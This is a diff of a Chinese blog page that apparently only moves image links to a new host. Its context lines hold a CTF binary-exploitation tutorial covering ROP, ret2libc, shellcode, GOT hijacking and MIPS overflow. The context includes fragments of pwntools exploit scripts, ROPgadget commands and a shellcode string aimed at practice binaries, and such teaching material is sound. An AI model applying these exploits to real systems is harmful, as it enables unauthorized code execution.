@@ -920,10 +920,10 @@ python -c &quot;print &#39;A&#39;*112 + &#39;BBBB&#39; &quot; &gt; test
 # 在GDB中执行
 run &lt; test</code></pre>
 <p>结果如下,可以看到<code>EIP</code>已经被劫持为<code>0X424242(BBBB)</code>:</p>
-<p><img src="http://file.smilehacker.net/1571476789765.png" alt="EIP已被劫持"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571476789765.png" alt="EIP已被劫持"></p>
 <h3 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>接下来尝试在程序中寻找调用系统命令地地方,在<code>IDA</code>中按<code>ALT+T</code>搜索<code>/bin/sh</code>，正好看到有,并且调用了<code>system</code>函数</p>
-<p><img src="http://file.smilehacker.net/1571476973841.png" alt="IDA搜索结果"></p>
-<p><img src="http://file.smilehacker.net/1571477030249.png" alt="IDA搜索结果"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571476973841.png" alt="IDA搜索结果"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571477030249.png" alt="IDA搜索结果"></p>
 <p>接下来使用<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"><code>pwntools</code></a>这个库来编写<code>EXP</code>:</p>
 <pre><code class="python">from pwn import *
 
@@ -932,12 +932,12 @@ sh = 0x804863a
 pwn1.sendline(&#39;A&#39; * (112) + p32(sh))
 pwn1.interactive()</code></pre>
 <p>运行后成功拿到<code>shell</code>,第一关很简单.</p>
-<p><img src="http://file.smilehacker.net/1571477253129.png" alt="reverse shell"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571477253129.png" alt="reverse shell"></p>
 <h2 id="二"><a href="#二" class="headerlink" title="二"></a>二</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn2" target="_blank" rel="noopener">pwn2</a></p>
 <p><code>cheksec</code>检查保护情况</p>
-<p><img src="http://file.smilehacker.net/1571477404317.png" alt="checksec检查保护"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571477404317.png" alt="checksec检查保护"></p>
 <p><code>IDA</code>查看代码</p>
-<p><img src="http://file.smilehacker.net/1571478271475.png" alt="IDA查看代码"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571478271475.png" alt="IDA查看代码"></p>
 <p>跟第一关不同的是，这里没有<code>system</code>函数给我们调用了。</p>
 <h3 id="Linux系统调用"><a href="#Linux系统调用" class="headerlink" title="Linux系统调用"></a>Linux系统调用</h3><p>Linux 的系统调用通过 <code>int 80h</code>实现，用<a href="https://zh.wikipedia.org/w/index.php?title=系统调用号&action=edit&redlink=1" target="_blank" rel="noopener">系统调用号</a>来区分入口函数。操作系统实现系统调用的基本过程是：</p>
 <ul>
@@ -975,9 +975,9 @@ int 0x80,   # 执行系统调用</code></pre>
 <pre><code class="assembly">pop ebx; ret 
 pop ecx; ret</code></pre>
 <p>也是完全可以的，但是这里并没有单条<code>pop ecx; ret</code>。不过我们在下面可以用<code>0x0806eb90</code>处这条指令加深理解</p>
-<p> <img src="http://file.smilehacker.net/1571496009275.png" alt="搜索结果"></p>
+<p> <img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571496009275.png" alt="搜索结果"></p>
 <p>寻找系统调用和需要执行命令的字符串</p>
-<p><img src="http://file.smilehacker.net/1571497154238.png" alt="1571497154238"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571497154238.png" alt="1571497154238"></p>
 <p> 这里选择的每一个gadgets都含有<code>ret</code>是为了能够使得程序自动持续的选择堆栈中的指令依次执行。在构造这些gadgets之前，我们通过下面的堆栈指针移动图，来分析一下<code>eip</code>指针的移动，以及对应获取的数据内容。<code>ret</code>指令可以理解成去栈顶的数据作为下次跳转的位置。</p>
 <pre><code class="assembly">eip = [esp];
 
@@ -987,7 +987,7 @@ esp = esp+4;
 
 pop eip;</code></pre>
 <p>此时,我们的堆栈布置如下:</p>
-<p><img src="http://file.smilehacker.net/1571551902372.png" alt="堆栈结构"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571551902372.png" alt="堆栈结构"></p>
 <p>整个堆栈的调用过程:</p>
 <ol>
 <li>执行<code>gets</code>函数，发生溢出，返回地址被淹没为<code>0x080bb196</code></li>
@@ -1012,11 +1012,11 @@ sh.interactive()
 
 </code></pre>
 <p>执行<code>EXP</code>，成功拿到<code>shell</code></p>
-<p><img src="http://file.smilehacker.net/1571552245667.png" alt="success"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571552245667.png" alt="success"></p>
 <h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>我们用<code>0x0806eb90</code>处的指令重新布置栈帧,加深理解</p>
-<p><img src="http://file.smilehacker.net/1571496009275.png" alt="搜索结果"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571496009275.png" alt="搜索结果"></p>
 <p>那么此时的栈帧布局就是:</p>
-<p><img src="http://file.smilehacker.net/1571553359527.png" alt="此时栈帧布局"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571553359527.png" alt="此时栈帧布局"></p>
 <p>写出POC：</p>
 <pre><code class="python">from pwn import *
 
@@ -1033,19 +1033,19 @@ sh.sendline(payload)
 sh.interactive()
 </code></pre>
 <p>成功执行:</p>
-<p><img src="http://file.smilehacker.net/1571553500352.png" alt="成功"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571553500352.png" alt="成功"></p>
 <h2 id="三"><a href="#三" class="headerlink" title="三"></a>三</h2><p>下载题目:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn3" target="_blank" rel="noopener">pwn</a></p>
 <p><code>checksec</code>检查保护保护状态:</p>
-<p><img src="http://file.smilehacker.net/1571554078794.png" alt="check检查保护状态"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571554078794.png" alt="check检查保护状态"></p>
 <p><code>IDA</code>查看汇编代码:</p>
-<p><img src="http://file.smilehacker.net/1571554361586.png" alt="反编译"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571554361586.png" alt="反编译"></p>
 <p>基本跟第二道题目一样，但是我们像第二道题目一样去寻找<code>ROP</code>链的时候发现并没有找到合适的指令</p>
-<p><img src="http://file.smilehacker.net/1571554491573.png" alt="寻找指令失败"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571554491573.png" alt="寻找指令失败"></p>
 <p>那也只能尝试其他的方法了,我们在<code>IDA</code>中查看下他的导入函数,发现其中有<code>system</code>函数,那我们直接调用这个函数即可</p>
-<p><img src="http://file.smilehacker.net/1571554930443.png" alt="import导入函数"></p>
-<p><img src="http://file.smilehacker.net/1571555353609.png" alt="SYSTEM函数调用"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571554930443.png" alt="import导入函数"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571555353609.png" alt="SYSTEM函数调用"></p>
 <p>有了<code>system</code>函数之后,用<code>ROPgadget</code>寻找一下<code>/bin/sh</code>这个字符串.</p>
-<p><img src="http://file.smilehacker.net/1571555487359.png" alt="寻找/bin/sh"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571555487359.png" alt="寻找/bin/sh"></p>
 <h3 id="EXP编写-1"><a href="#EXP编写-1" class="headerlink" title="EXP编写"></a>EXP编写</h3><pre><code class="python">from pwn import *
 
 sh = process(&quot;./pwn3&quot;)
@@ -1062,27 +1062,27 @@ sh.interactive()
 <p>在正常调用system函数的时候，堆栈位置的<code>system_addr</code>之后的内容为<code>system</code>函数的返回地址，在之后才是新的堆栈的栈顶位置，因此在<code>systetem_addr</code>和<code>sh_addr</code>之间增加了4个字符来进行填充。 </p>
 <h2 id="四"><a href="#四" class="headerlink" title="四"></a>四</h2><p>下载地址: <a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn4" target="_blank" rel="noopener">pwn</a></p>
 <p><code>checksec</code>检测程序保护机制</p>
-<p><img src="http://file.smilehacker.net/1571556472396.png" alt="check检测"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571556472396.png" alt="check检测"></p>
 <p>还是一样的，我们再来看程序的导入表:</p>
-<p><img src="http://file.smilehacker.net/1571556603660.png" alt="查看导入表"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571556603660.png" alt="查看导入表"></p>
 <p>发现是有<code>system</code>函数的，继续通过<code>ROPgadget</code>分析，发现没有<code>/bin/sh</code>字符串.</p>
-<p><img src="http://file.smilehacker.net/1571556697767.png" alt="ROPgadgets分析"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571556697767.png" alt="ROPgadgets分析"></p>
 <h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>现在得想个法子。直观的想法是在<code>shellcode</code>中，在参数的位置直接放入字符串“/bin/sh”，比如下面这样： </p>
 <blockquote>
 <p> payload = flat([‘a’ * 112, system_plt, 0xabcdabcd, “/bin/sh”]) </p>
 </blockquote>
 <p>看着可行,但是放在堆栈中的是程序执行的路线图(都是通过指针调用的)，而不是实际的程序或者字符串 。而 ”/bin/sh”对应的4个字节的地址所指向的内存空间明显不合法。但是如果我们可以把<code>/bin/sh</code>塞到一个变量中，然后让<code>system</code>函数去调用他。我们就可以达到目的。可是这个变量哪里找了？我们可以去看<code>ELF</code>程序的<code>bss</code>段，<code>bss</code>段用于存放程序中未经初始化的全局变量和静态局部变量 。很巧，正好有一个。</p>
-<p><img src="http://file.smilehacker.net/1571557290759.png" alt="bss段"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571557290759.png" alt="bss段"></p>
 <p>有了地址之后,一个新的问题产生,我们要怎么把<code>/bin/sh</code>塞到<code>buf2</code>这个变量中? 看看导入函数,那个<code>gets</code> :kissing_heart:</p>
 <h3 id="EXP编写-2"><a href="#EXP编写-2" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>下面这一段原文作者没有写，都是个人理解，有可能不对，可以看文末的链接</p>
 <p>在写<code>EXP</code>之前,我们需要分析一下我们现在的栈帧应该怎么布置:</p>
-<p><img src="http://file.smilehacker.net/1571558124555.png" alt="栈帧的布置"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571558124555.png" alt="栈帧的布置"></p>
 <p>看上去还行，但是又有一个新的问题,<code>gets</code>函数执行完的返回地址我们要怎么填写?程序会被这个返回地址直接带跑，直接填成<code>system</code>的地址？那参数又怎么给到system？</p>
 <p>作者在这里的思路是很巧妙的<code>gets</code>函数的返回地址处存指向一条<code>pop x</code>,pop谁都可以，我们主要是利用<code>pop</code>的<code>esp+4</code>的功能。</p>
 <pre><code class="shell">ROPgadget --binary pwn4 --only &#39;pop|ret&#39;
 </code></pre>
 <p>用第一条第三条都可以。</p>
-<p><img src="http://file.smilehacker.net/1571558379470.png" alt="ROPgadget运行结果"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571558379470.png" alt="ROPgadget运行结果"></p>
 <p>整个运行过程如下:</p>
 <ol>
 <li>程序接收输入,缓冲区溢出,返回地址被淹没成<code>gets</code>函数,并从栈中获取参数</li>
@@ -1113,10 +1113,10 @@ sh.interactive()
 
 </code></pre>
 <p>成功获得<code>shell</code></p>
-<p><img src="http://file.smilehacker.net/1571558914053.png" alt="成功"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571558914053.png" alt="成功"></p>
 <h2 id="五"><a href="#五" class="headerlink" title="五"></a>五</h2><p>下载地址:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn5" target="_blank" rel="noopener">pwn</a></p>
 <p><code>checksec</code>检查保护情况:</p>
-<p><img src="http://file.smilehacker.net/1571559117913.png" alt="checksec"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571559117913.png" alt="checksec"></p>
 <p>发现关闭了<code>NX</code>保护,也就是说可以在堆栈上执行代码了,但是开启了<code>PIE</code>保护,也就是地址随机化,而且程序也变成了64位程序。</p>
 <blockquote>
 <p>PS: 之前看逆向工程权威指南隐约记得传参不一样,这里刚好又出现了。</p>
@@ -1136,11 +1136,11 @@ sh.interactive()
 </ul>
 </blockquote>
 <p><code>IDA</code>分析程序:</p>
-<p><img src="http://file.smilehacker.net/1571559310062.png" alt="IDA分析pwn5"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571559310062.png" alt="IDA分析pwn5"></p>
 <h3 id="确定漏洞位置"><a href="#确定漏洞位置" class="headerlink" title="确定漏洞位置"></a>确定漏洞位置</h3><p>一眼就看到了<code>read</code>函数,但是他只读了<code>0x40</code>个字节(64)字节</p>
 <h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><p>现在很熟练了,偏移<code>0x10h</code>个字节,也就是16个字节.然后16+8=24，也就是我们在输入到24个字节是就可以覆盖返回地址</p>
 <h3 id="查看可用函数"><a href="#查看可用函数" class="headerlink" title="查看可用函数"></a>查看可用函数</h3><p>看一下导入函数,发现啥也没</p>
-<p><img src="http://file.smilehacker.net/1571559651228.png" alt="查看导入函数"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571559651228.png" alt="查看导入函数"></p>
 <p>但是堆栈可以执行,我们需要直接放<code>shellcode</code>放在栈中,在这之前我们要计算一下堆栈中可以存放多少字节的<code>shellcode</code>。</p>
 <blockquote>
 <p>64 - 24 -8 =32 （返回地址自身的8个自己要记得计算)</p>
@@ -1155,7 +1155,7 @@ shellcode_x64 = &quot;x31xf6x48xbbx2fx62x69x6ex2fx2fx73x68x56x53x54x5fx6ax3bx58x
 <p>无解了。再回去看一下程序的代码，这个<code>printf</code>函数干了什么。它把<code>buf</code>的地址给打印出来了:sweat:</p>
 <p>妙啊~</p>
 <p>然后整理一下，看缓冲区怎么布置</p>
-<p><img src="http://file.smilehacker.net/1571560805846.png" alt="缓冲区布置"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571560805846.png" alt="缓冲区布置"></p>
 <h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
 
 sh = process(&#39;./pwn5&#39;)
@@ -1173,10 +1173,10 @@ sh.interactive()
 <p>参考一下就好,代码并不能运行。没有细看过<code>pwntools</code>模块,也就不做调试了。</p>
 <h2 id="六"><a href="#六" class="headerlink" title="六"></a>六</h2><p>下载地址:<a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn6" target="_blank" rel="noopener">pwn</a></p>
 <p><code>checksec</code>检查程序:</p>
-<p><img src="http://file.smilehacker.net/1571561335922.png" alt="checksec检查pwn6"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571561335922.png" alt="checksec检查pwn6"></p>
 <p>啥也没开,别激动,不好搞。</p>
 <p>IDA查看代码:</p>
-<p><img src="http://file.smilehacker.net/1571561531179.png" alt="IDA分析pwn6"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571561531179.png" alt="IDA分析pwn6"></p>
 <h3 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h3><p>一眼就看到<code>gets</code>函数了,但是空间只有<code>0x32</code>即50字节</p>
 <h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>现在计算很快了,0x20 + 4 = 0x24 = 32个字节,即淹没32字节即可淹没返回地址</p>
 <h3 id="导入函数表"><a href="#导入函数表" class="headerlink" title="导入函数表"></a>导入函数表</h3><p>不截图了, 没有<code>system</code>函数</p>
@@ -1196,14 +1196,14 @@ sh.interactive()
 <p>在函数的返回地址，我们需要一段指令让程序可以跳转到跳转到<code>esp</code>,这样才能继续执行栈帧上的代码:</p>
 <pre><code class="shell">ROPgadget --binary stack_pivoting_1 --only &#39;jmp|ret&#39; | grep &#39;esp&#39;
 </code></pre>
-<p><img src="http://file.smilehacker.net/1571571949860.png" alt="寻找jmp esp"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571571949860.png" alt="寻找jmp esp"></p>
 <p>继续回到栈帧执行代码,我们在栈帧之后布置如下指令.</p>
 <pre><code class="assembly">sub esp 0x28; 
 jmp esp;
 </code></pre>
 <p><code>shellcode</code>得到执行。</p>
 <p>看一下当前栈帧的布局:</p>
-<p><img src="http://file.smilehacker.net/1571572971883.png" alt="当前栈帧布局"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1571572971883.png" alt="当前栈帧布局"></p>
 <p>仔细想想,不太好懂。</p>
 <h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *
 
@@ -1223,7 +1223,7 @@ sh.interactive()
 <p>没办法成功执行,换了个<code>x86</code>平台的shell，我感觉这个<code>shellcode</code>有问题！！</p>
 <h2 id="七"><a href="#七" class="headerlink" title="七"></a>七</h2><p>下载地址: <a href="https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop_2/pwn7" target="_blank" rel="noopener">pwn7</a></p>
 <p>上来还老规矩,使用<code>checksec</code>检查程序保护情况:</p>
-<p><img src="http://file.smilehacker.net/1572240054879.png" alt="checksec检查pwn7"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1572240054879.png" alt="checksec检查pwn7"></p>
 <p>只开启了<code>DEP</code>保护。<code>IDA</code>查看掠过，漏洞函数还是一样的，但是没有导入函数,没有合适的<code>Gadget</code>语句。怎么办？</p>
 <p>劫持<code>GOT</code></p>
 <h3 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a>Hijack GOT</h3><blockquote>
@@ -1250,7 +1250,7 @@ sh.interactive()
 <p>那么<code>PLT</code>表内存储的入口点是什么?</p>
 <ul>
 <li><p>存储的是<code>GOT</code>表中对应条数的地址</p>
-<p><img src="http://file.smilehacker.net/1572242662913.png" alt="PLT存储"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1572242662913.png" alt="PLT存储"></p>
 </li>
 </ul>
 <p>既然外部函数地址都存放在<code>GOT</code>中,而不是<code>PLT</code>，<code>PLT</code>存储的入口点又指向<code>GOT</code>的对应条目，那程序为什么选在<code>PLT</code>作为函数的入口点，而不是<code>GOT</code>? 在程序启动时确定所有外部函数的内存地址并写入<code>GOT</code>表，之后只使用<code>GOT</code>表不是更方便吗？ </p>
@@ -1271,9 +1271,9 @@ sh.interactive()
 </li>
 </ul>
 <p>第一次调用的示意图:</p>
-<p> <img src="http://file.smilehacker.net/v2-b78288c5eb8bfd2568728f34fbbb0e9e_hd.png" alt="第一次调用"> </p>
+<p> <img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/v2-b78288c5eb8bfd2568728f34fbbb0e9e_hd.png" alt="第一次调用"> </p>
 <p>不是第一次调用的示意图:</p>
-<p> <img src="http://file.smilehacker.net/v2-caa5320d0bb0101edad4b9127f6fe413_hd.png" alt="不是第一次调用"></p>
+<p> <img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/v2-caa5320d0bb0101edad4b9127f6fe413_hd.png" alt="不是第一次调用"></p>
 <p>上面的这个过程采用了<code>LAZY</code>设计思想, 它将需要完成的操作(解析外部函数的内存地址)留到调用实际发生时才进行，而非在程序一开始运行时就解析出全部函数地址。跟<code>python</code>中的生成器有点像，懒加载</p>
 <p>这个过程也启示了我们如何实现函数的伪装，那就是到<code>GOT</code>表中将函数<code>A</code>的地址修改为函数<code>B</code>的地址。这样在后面所有对函数<code>A</code>的调用都会执行函数<code>B</code>。我们可以将目标分解成以下几个步骤:</p>
 <ul>
@@ -1337,7 +1337,7 @@ sh.sendline(payload)
 
 sh.interactive()
 </code></pre>
-<h3 id="GET-SHELL"><a href="#GET-SHELL" class="headerlink" title="GET SHELL"></a>GET SHELL</h3><p><img src="http://file.smilehacker.net/1572270342624.png" alt="成功获取shell"></p>
+<h3 id="GET-SHELL"><a href="#GET-SHELL" class="headerlink" title="GET SHELL"></a>GET SHELL</h3><p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/Linux_PWN/1572270342624.png" alt="成功获取shell"></p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
 <li><a href="https://www.anquanke.com/post/id/164530" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164530</a></li>
 <li><a href="https://www.anquanke.com/post/id/168468" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168468</a></li>
@@ -1417,7 +1417,7 @@ void main()
 <li>-o 输出文件的名称</li>
 <li>-static 静态编译</li>
 </ul>
-<p>编译完成后可尝试使用<code>qemu-mipsel</code>验证程序正确性<br><img src="http://file.smilehacker.net/info_1.png" alt="环境介绍"></p>
+<p>编译完成后可尝试使用<code>qemu-mipsel</code>验证程序正确性<br><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E4%BD%BF%E7%94%A8GBD%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84/info_1.png" alt="环境介绍"></p>
 <p>从上面图片可以看出,编译产生的程序为一个MIPS程序,在Linux下无法直接运行,生成<code>passwd</code>文件(一个正常的输入文件，并没有造成溢出),使用<code>qemu-mipsel</code>模拟程序获得执行结果。</p>
 <h4 id="使用GDB动态调试程序"><a href="#使用GDB动态调试程序" class="headerlink" title="使用GDB动态调试程序"></a>使用<code>GDB</code>动态调试程序</h4><p>启动<code>qemu</code>远程调试</p>
 <blockquote>
@@ -1437,18 +1437,18 @@ pwndbg&gt; set architecture mips #设置为Mips架构
 The target architecture is assumed to be mips
 pwndbg&gt; target remote localhost:1234 #设置远程端口
 </code></pre>
-<p><img src="http://file.smilehacker.net/Gdbset.png" alt="GDB调试设置"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E4%BD%BF%E7%94%A8GBD%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84/Gdbset.png" alt="GDB调试设置"></p>
 <p>现在重新生成<code>passwd</code>文件,使用python向文件中写入600个A</p>
 <blockquote>
 <p>python -c “print ‘A’*600 “&gt; passwd</p>
 </blockquote>
 <p>之后重新用gdb加载程序,直接输入<code>r</code>让程序直接运行。</p>
-<p><img src="http://file.smilehacker.net/info2.png" alt="Alt text"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E4%BD%BF%E7%94%A8GBD%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84/info2.png" alt="Alt text"></p>
 <p>可以看到程序直接崩溃，并且崩溃后的<code>PC</code>寄存器指向了<code>0x41414141</code>(A的16进制为0x41)</p>
 <h4 id="劫持执行流程"><a href="#劫持执行流程" class="headerlink" title="劫持执行流程"></a>劫持执行流程</h4><p>从上面可以看到,不仅程序崩溃了,而且完全劫持了函数流程,让<code>PC</code>指针指向0x41414141,现在尝试精准定位，究竟淹没多少个自己可以劫持程序的执行流程。</p>
 <h5 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h5><p>通过静态分析发现,如果要使缓冲区溢出,并控制到堆栈中的返回地址saved_ra,需要覆盖的数据大小应该达到0x1A0-0x04即0x19c字节;作者这里运用这个公式的依据是什么呢?让我们回顾一下X86架构下的情形:</p>
 <p>偏移不就是找buf和ra之间的偏移么,ra是存储于栈里面的(有点类似于x86里面的ret指令),buf指向栈里面,只要计算出buf的初始位置和ra之间的偏移,就可以计算出有多少个字节就可以溢出到ra了！</p>
-<h5 id="寻找偏移"><a href="#寻找偏移" class="headerlink" title="寻找偏移"></a>寻找偏移</h5><p><img src="http://file.smilehacker.net/findoffest.png" alt="寻找偏移"></p>
+<h5 id="寻找偏移"><a href="#寻找偏移" class="headerlink" title="寻找偏移"></a>寻找偏移</h5><p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E4%BD%BF%E7%94%A8GBD%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84/findoffest.png" alt="寻找偏移"></p>
 <pre><code class="Mips">addiu   $sp, -0x1D0            //sp &lt;==sp-0x1D0
 sw      $ra, 0x1D0+var_4($sp)  //将ra里面的值存放于堆栈里面,其偏移值为                                            0x1D0+var_4
 sw      $fp, 0x1D0+var_8($sp)  //将fp里面的值存放于堆栈里面,其偏移为0x1D0+var_8
@@ -1473,19 +1473,19 @@ nop</code></pre>
 <pre><code class="shell">disassemble main # 查看main函数的汇编代码
 
 break *main+740 # 在main函数后740行处下断点</code></pre>
-<p><img src="http://file.smilehacker.net/gccbreaks.png" alt="汇编下断点"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E4%BD%BF%E7%94%A8GBD%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84/gccbreaks.png" alt="汇编下断点"></p>
 <p>断点下好后输入<code>c</code>,让程序运行到刚刚下的断点处</p>
-<p><img src="http://file.smilehacker.net/return.png" alt="继续运行"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E4%BD%BF%E7%94%A8GBD%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84/return.png" alt="继续运行"></p>
 <p>输入<code>n</code>,让函数运行到756行，如果<code>ra</code>被替换成<code>0x42424242</code>,就说明我们的猜想是正确的。</p>
-<p><img src="http://file.smilehacker.net/validate.png" alt="猜想成功"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E4%BD%BF%E7%94%A8GBD%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84/validate.png" alt="猜想成功"></p>
 <p>可以看到pc的值已经成功被劫持为<code>0x42424242</code>了</p>
 <h4 id="构造ROP-chain"><a href="#构造ROP-chain" class="headerlink" title="构造ROP chain"></a>构造ROP chain</h4><p>一般漏洞攻击的途径有两种:一是命令执行,另外一种方法是执行shellcode;<br>这里只谈命令执行的方法:<br>在源程序里面有一个函数do_system_0.虽然从代码里面可以看出，do_system_0函数只能执行“ls -l”命令,但是我们可以构造一条ROP链,通过溢出漏洞调用这个函数,使得这个函数能够执行任意命令.想要构造出ROP链,首先构造出do_system_0这个函数的两个参数,将两个参数分别 装入寄存器<br>a0和a1,这里只需要控制寄存器$a1即可,该参数是命令的字符串地址</p>
 <p>使用<code>IDA</code>脚本插件<code>mipsrop.py</code>搜索合适的<code>ROP Chain</code></p>
-<p><img src="http://file.smilehacker.net/ROPfinder.png" alt="寻找合适的rop链"></p>
-<p><img src="http://file.smilehacker.net/ROPchain.png" alt="ROP"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E4%BD%BF%E7%94%A8GBD%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84/ROPfinder.png" alt="寻找合适的rop链"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E4%BD%BF%E7%94%A8GBD%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84/ROPchain.png" alt="ROP"></p>
 <p>在缓冲区溢出时,直接让<code>ra</code>的值指向<code>0x00401FA0</code>,<strong>因为<code>ROP技术</code>使用的堆栈都是同一个堆栈</strong>，只要让<code>$sp+0x58+var_40</code>的值为想要执行的命令,并且在<code>$sp+0x58+var_4</code>处的值存放成跳转到<code>do_system_0</code>函数的地址(<code>0x00400678</code>),就可以达到目的。</p>
-<p><img src="http://file.smilehacker.net/RAreturn.png" alt="设置RA的值"></p>
-<p>现在整理一下当前栈帧:<br><img src="http://file.smilehacker.net/stackinfo.png" alt="当前栈帧"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E4%BD%BF%E7%94%A8GBD%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84/RAreturn.png" alt="设置RA的值"></p>
+<p>现在整理一下当前栈帧:<br><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/%E4%BD%BF%E7%94%A8GBD%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84/stackinfo.png" alt="当前栈帧"></p>
 <h4 id="整理POC"><a href="#整理POC" class="headerlink" title="整理POC"></a>整理POC</h4><pre><code class="python">&quot;&quot;&quot;
 struct.pack(&quot;&lt;L&quot;,&quot;xxx&quot;)为小端序
 struct.pack(&quot;&gt;L&quot;,&quot;xxx&quot;)为大端序
@@ -1513,7 +1513,7 @@ fw.write(shellcode)#&#39;A&#39;*300+&#39;\x00&#39;*10+&#39;BBBB&#39;)
 fw.close()
